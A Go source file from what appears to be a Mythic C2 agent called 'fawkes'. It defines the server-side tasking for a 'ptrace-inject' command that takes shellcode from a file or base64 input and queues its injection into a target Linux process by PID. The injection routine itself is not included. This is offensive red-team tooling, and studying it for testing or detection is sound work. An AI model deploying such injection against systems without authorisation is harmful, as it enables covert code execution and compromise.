package agentfunctions

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "ptrace-inject",
		Description:         "Linux process injection via ptrace syscall — attach to a target process, write shellcode, and execute it",
		HelpString:          "ptrace-inject -action check | ptrace-inject -pid <PID> -filename <shellcode>",
		Version:             1,
		MitreAttackMappings: []string{"T1055.008"}, // Process Injection: Ptrace System Calls
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_LINUX},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:      "check: show ptrace config and candidate processes. inject: perform shellcode injection.",
				Choices:          []string{"inject", "check"},
				DefaultValue:     "inject",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 0},
					{ParameterIsRequired: true, GroupName: "New File", UIModalPosition: 0},
					{ParameterIsRequired: true, GroupName: "Check", UIModalPosition: 0},
					{ParameterIsRequired: true, GroupName: "CLI", UIModalPosition: 0},
				},
			},
			{
				Name:                 "filename",
				ModalDisplayName:     "Shellcode File",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:          "Select shellcode file from Mythic's file storage",
				Choices:              []string{},
				DefaultValue:         "",
				DynamicQueryFunction: getFileList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 1},
				},
			},
			{
				Name:             "file",
				ModalDisplayName: "Shellcode File",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_FILE,
				Description:      "Upload a new shellcode file to inject",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "New File", UIModalPosition: 1},
				},
			},
			{
				Name:             "shellcode_b64",
				ModalDisplayName: "Shellcode (base64)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Base64-encoded shellcode (for CLI/API usage)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "CLI", UIModalPosition: 1},
				},
			},
			{
				Name:             "pid",
				ModalDisplayName: "Target PID",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "The process ID to inject shellcode into",
				DefaultValue:     0,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 2},
					{ParameterIsRequired: true, GroupName: "New File", UIModalPosition: 2},
					{ParameterIsRequired: true, GroupName: "CLI", UIModalPosition: 2},
				},
			},
			{
				Name:             "restore",
				ModalDisplayName: "Restore After Injection",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:      "Restore original code and registers after shellcode completes (default: true)",
				DefaultValue:     true,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 3},
					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 3},
					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 3},
				},
			},
			{
				Name:             "timeout",
				ModalDisplayName: "Timeout (seconds)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Timeout waiting for shellcode completion (default: 30)",
				DefaultValue:     30,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 4},
					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 4},
					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 4},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			if strings.ToLower(action) == "check" {
				params := map[string]interface{}{
					"action": "check",
				}
				paramsJSON, _ := json.Marshal(params)
				taskData.Args.SetManualArgs(string(paramsJSON))
				displayParams := "Check ptrace configuration"
				response.DisplayParams = &displayParams
				return response
			}

			// Inject mode — need shellcode and PID
			var fileContents []byte
			var filename string
			var err error

			switch strings.ToLower(taskData.Task.ParameterGroupName) {
			case "default":
				filename, err = taskData.Args.GetStringArg("filename")
				if err != nil {
					logging.LogError(err, "Failed to get filename")
					response.Success = false
					response.Error = "Failed to get shellcode file: " + err.Error()
					return response
				}

				search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
					CallbackID:      taskData.Callback.ID,
					Filename:        filename,
					LimitByCallback: false,
					MaxResults:      -1,
				})
				if err != nil || !search.Success || len(search.Files) == 0 {
					response.Success = false
					response.Error = fmt.Sprintf("Failed to find file: %s", filename)
					return response
				}

				getResp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
					AgentFileID: search.Files[0].AgentFileId,
				})
				if err != nil || !getResp.Success {
					response.Success = false
					response.Error = "Failed to get file contents"
					return response
				}
				fileContents = getResp.Content

			case "new file":
				fileID, err := taskData.Args.GetStringArg("file")
				if err != nil {
					logging.LogError(err, "Failed to get file")
					response.Success = false
					response.Error = "Failed to get shellcode file: " + err.Error()
					return response
				}

				search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
					AgentFileID: fileID,
				})
				if err != nil || !search.Success || len(search.Files) == 0 {
					response.Success = false
					response.Error = "Failed to find the specified file"
					return response
				}
				filename = search.Files[0].Filename

				getResp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
					AgentFileID: fileID,
				})
				if err != nil || !getResp.Success {
					response.Success = false
					response.Error = "Failed to get file contents"
					return response
				}
				fileContents = getResp.Content

			case "cli":
				// CLI/API mode — shellcode passed directly as base64
				shellcodeB64, err := taskData.Args.GetStringArg("shellcode_b64")
				if err != nil || shellcodeB64 == "" {
					response.Success = false
					response.Error = "shellcode_b64 parameter required"
					return response
				}
				fileContents, err = base64.StdEncoding.DecodeString(shellcodeB64)
				if err != nil {
					response.Success = false
					response.Error = "Failed to decode shellcode_b64: " + err.Error()
					return response
				}
				filename = "cli-shellcode"

			case "check":
				params := map[string]interface{}{
					"action": "check",
				}
				paramsJSON, _ := json.Marshal(params)
				taskData.Args.SetManualArgs(string(paramsJSON))
				displayParams := "Check ptrace configuration"
				response.DisplayParams = &displayParams
				return response

			default:
				response.Success = false
				response.Error = fmt.Sprintf("Unknown parameter group: %s", taskData.Task.ParameterGroupName)
				return response
			}

			pid, err := taskData.Args.GetNumberArg("pid")
			if err != nil || pid <= 0 {
				response.Success = false
				response.Error = "Invalid PID specified (must be greater than 0)"
				return response
			}

			restore := true
			if r, err := taskData.Args.GetBooleanArg("restore"); err == nil {
				restore = r
			}

			timeout := 30
			if t, err := taskData.Args.GetNumberArg("timeout"); err == nil && t > 0 {
				timeout = int(t)
			}

			displayParams := fmt.Sprintf("Shellcode: %s (%d bytes) → PID %d (restore=%v, timeout=%ds)",
				filename, len(fileContents), int(pid), restore, timeout)
			response.DisplayParams = &displayParams
			createArtifact(taskData.Task.ID, "Process Inject",
				fmt.Sprintf("PTRACE_ATTACH/PTRACE_POKETEXT into PID %d (%d bytes)", int(pid), len(fileContents)))

			params := map[string]interface{}{
				"action":        "inject",
				"pid":           int(pid),
				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
				"restore":       restore,
				"timeout":       timeout,
			}
			paramsJSON, err := json.Marshal(params)
			if err != nil {
				response.Success = false
				response.Error = "Failed to create task parameters: " + err.Error()
				return response
			}
			taskData.Args.SetManualArgs(string(paramsJSON))

			return response
		},
	})
}
